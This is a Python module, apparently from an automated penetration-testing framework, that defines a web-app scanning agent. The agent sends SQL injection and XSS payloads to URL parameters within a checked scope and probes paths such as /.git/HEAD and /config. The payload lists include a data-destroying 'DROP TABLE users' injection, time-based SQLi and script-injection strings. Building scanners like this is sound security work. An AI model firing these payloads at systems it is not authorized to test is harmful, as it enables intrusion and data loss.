"""
WebApp Agent — tests web applications for SQLi, XSS, SSRF, IDOR, auth bypass.
"""
from __future__ import annotations

import logging
from typing import Any, Dict, List, Optional

from ..base_agent import BaseAgent, Hypothesis, HypothesisResult

logger = logging.getLogger(__name__)

# Common payloads for quick testing
SQLI_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "1; DROP TABLE users--",
    "1' AND SLEEP(5)--",
    "\" OR \"\"=\"",
    "') OR ('1'='1",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL, NULL--",
    "1 AND 1=1",
    "1 AND 1=2",
    "' HAVING 1=1--",
    "' GROUP BY columnnames having 1=1 --",
    "' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'tablename')--",
    "' waitfor delay '0:0:5'--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'\"><script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "'-alert(1)-'",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
]


class WebAppAgent(BaseAgent):
    """
    Agent specialising in web application vulnerability testing.

    Tests: SQL injection, XSS (reflected/stored/DOM), IDOR, auth bypass, SSRF.
    Uses the KNOW→THINK→TEST→VALIDATE reasoning loop.
    """

    agent_type = "webapp"

    async def orient(self) -> None:
        """Load what we already know about this target's web surface."""
        known = self.working_memory.get("discoveries", [])
        logger.info("[%s] Orient: %d prior discoveries loaded", self.agent_id[:8], len(known))

        # Pull endpoint list from engagement memory
        try:
            endpoints = await self.engagement_memory.get_discoveries("endpoint")
            self.working_memory.set("endpoints", endpoints)
        except Exception as exc:
            logger.warning("Could not load endpoints from engagement memory: %s", exc)
            self.working_memory.set("endpoints", [])

    async def observe(self) -> List[dict]:
        """Probe the target to discover web endpoints and parameters."""
        observations = []
        target = self.objective.split(":")[-1] if ":" in self.objective else self.scope_subset.get("url", "")

        if not target:
            logger.warning("[%s] No target URL in scope_subset", self.agent_id[:8])
            return []

        if not self.check_scope(target):
            logger.warning("[%s] Target %s out of scope", self.agent_id[:8], target)
            return []

        # Use HTTP client to probe target
        http_client = self.tools.get("http_client")
        if http_client:
            try:
                resp = await http_client.get(target)
                observations.append({
                    "type": "http_probe",
                    "url": target,
                    "status_code": resp.status_code,
                    "content_length": len(resp.body),
                    "headers": dict(resp.headers),
                })
                self.working_memory.set("base_response", {
                    "status": resp.status_code,
                    "body_length": len(resp.body),
                    "body": resp.body[:5000],  # first 5KB
                })
            except Exception as exc:
                logger.error("[%s] HTTP probe failed: %s", self.agent_id[:8], exc)

        return observations

    async def hypothesize(self) -> List[Hypothesis]:
        """Generate testable vulnerability hypotheses based on observations."""
        hypotheses = []
        endpoints = self.working_memory.get("endpoints", [])

        # If we have specific endpoints, test them
        if endpoints:
            for ep in endpoints[:5]:  # limit scope
                url = ep.get("url", "")
                params = ep.get("parameters", [])
                for param in params:
                    hypotheses.append(Hypothesis(
                        description=f"SQLi in {param} on {url}",
                        confidence=0.4,
                        target=url,
                        action="test_sqli",
                        parameters={"url": url, "parameter": param},
                        vuln_type="sqli",
                    ))
                    hypotheses.append(Hypothesis(
                        description=f"XSS in {param} on {url}",
                        confidence=0.35,
                        target=url,
                        action="test_xss",
                        parameters={"url": url, "parameter": param},
                        vuln_type="xss",
                    ))

        # Generic hypothesis from objective
        target = self.scope_subset.get("url", "")
        if target and not hypotheses:
            hypotheses.append(Hypothesis(
                description=f"Probe {target} for common web vulnerabilities",
                confidence=0.3,
                target=target,
                action="probe_target",
                parameters={"url": target},
                vuln_type=None,
            ))

        return hypotheses

    async def execute_hypothesis(self, hypothesis: Hypothesis) -> HypothesisResult:
        """Run a specific test and evaluate the result."""
        action = hypothesis.action
        params = hypothesis.parameters

        if action == "test_sqli":
            return await self._test_sqli(hypothesis, params)
        elif action == "test_xss":
            return await self._test_xss(hypothesis, params)
        elif action == "probe_target":
            return await self._probe_target(hypothesis, params)

        return HypothesisResult(
            hypothesis=hypothesis,
            outcome="error",
            evidence={"error": f"Unknown action: {action}"},
            updated_confidence=0.0,
        )

    async def _test_sqli(self, hypothesis: Hypothesis, params: dict) -> HypothesisResult:
        """Test a parameter for SQL injection."""
        url = params.get("url", "")
        parameter = params.get("parameter", "id")
        http_client = self.tools.get("http_client")

        if not http_client or not self.check_scope(url):
            return HypothesisResult(hypothesis=hypothesis, outcome="error",
                                     evidence={"error": "No HTTP client or out of scope"},
                                     updated_confidence=0.0)

        for payload in SQLI_PAYLOADS[:5]:  # test first 5
            try:
                resp = await http_client.get(url, params={parameter: payload})
                body = resp.body.lower() if resp.body else ""

                # Check for SQL error patterns
                error_indicators = [
                    "sql syntax", "ora-", "sqlstate", "mysql_fetch",
                    "syntax error", "unclosed quotation", "microsoft sql",
                ]
                if any(ind in body for ind in error_indicators):
                    finding = {
                        "vulnerability_type": "SQL Injection",
                        "title": f"SQL Injection in {parameter} parameter",
                        "description": f"Error-based SQLi detected. Payload: {payload}",
                        "url": url,
                        "parameter": parameter,
                        "severity": "high",
                        "confidence": 0.85,
                        "evidence": {
                            "payload": payload,
                            "status_code": resp.status_code,
                            "body_snippet": body[:200],
                        },
                        "tool_name": "webapp_agent",
                        "agent_type": "webapp",
                    }
                    return HypothesisResult(
                        hypothesis=hypothesis,
                        outcome="confirmed",
                        evidence=finding["evidence"],
                        updated_confidence=0.85,
                        finding=finding,
                    )
            except Exception as exc:
                logger.debug("SQLi test error for payload %r: %s", payload, exc)

        return HypothesisResult(
            hypothesis=hypothesis,
            outcome="refuted",
            evidence={"tested_payloads": len(SQLI_PAYLOADS[:5])},
            updated_confidence=0.1,
        )

    async def _test_xss(self, hypothesis: Hypothesis, params: dict) -> HypothesisResult:
        """Test a parameter for reflected XSS."""
        url = params.get("url", "")
        parameter = params.get("parameter", "q")
        http_client = self.tools.get("http_client")

        if not http_client or not self.check_scope(url):
            return HypothesisResult(hypothesis=hypothesis, outcome="error",
                                     evidence={"error": "No HTTP client or out of scope"},
                                     updated_confidence=0.0)

        for payload in XSS_PAYLOADS[:5]:
            try:
                resp = await http_client.get(url, params={parameter: payload})
                if resp.body and payload in resp.body:
                    finding = {
                        "vulnerability_type": "Cross-Site Scripting (XSS)",
                        "title": f"Reflected XSS in {parameter} parameter",
                        "description": f"Payload reflected in response without encoding: {payload}",
                        "url": url,
                        "parameter": parameter,
                        "severity": "medium",
                        "confidence": 0.8,
                        "evidence": {
                            "payload": payload,
                            "reflected": True,
                            "status_code": resp.status_code,
                        },
                        "tool_name": "webapp_agent",
                        "agent_type": "webapp",
                    }
                    return HypothesisResult(
                        hypothesis=hypothesis,
                        outcome="confirmed",
                        evidence=finding["evidence"],
                        updated_confidence=0.8,
                        finding=finding,
                    )
            except Exception as exc:
                logger.debug("XSS test error for payload %r: %s", payload, exc)

        return HypothesisResult(
            hypothesis=hypothesis,
            outcome="refuted",
            evidence={"tested_payloads": len(XSS_PAYLOADS[:5])},
            updated_confidence=0.1,
        )

    async def _probe_target(self, hypothesis: Hypothesis, params: dict) -> HypothesisResult:
        """Generic target probe — discover endpoints and tech stack."""
        url = params.get("url", "")
        http_client = self.tools.get("http_client")

        if not http_client:
            return HypothesisResult(hypothesis=hypothesis, outcome="inconclusive",
                                     evidence={}, updated_confidence=0.2)

        common_paths = ["/admin", "/login", "/api", "/api/v1", "/.git/HEAD",
                        "/robots.txt", "/sitemap.xml", "/wp-admin", "/config"]
        discovered = []
        for path in common_paths:
            try:
                full = url.rstrip("/") + path
                if not self.check_scope(full):
                    continue
                resp = await http_client.get(full)
                if resp.status_code not in (404, 410):
                    discovered.append({"path": path, "status": resp.status_code})
            except Exception:
                pass

        if discovered:
            await self.engagement_memory.store_discovery("interesting_paths", {"paths": discovered, "base": url})

        return HypothesisResult(
            hypothesis=hypothesis,
            outcome="inconclusive" if not discovered else "confirmed",
            evidence={"discovered_paths": discovered},
            updated_confidence=0.3 + min(len(discovered) * 0.05, 0.3),
        )
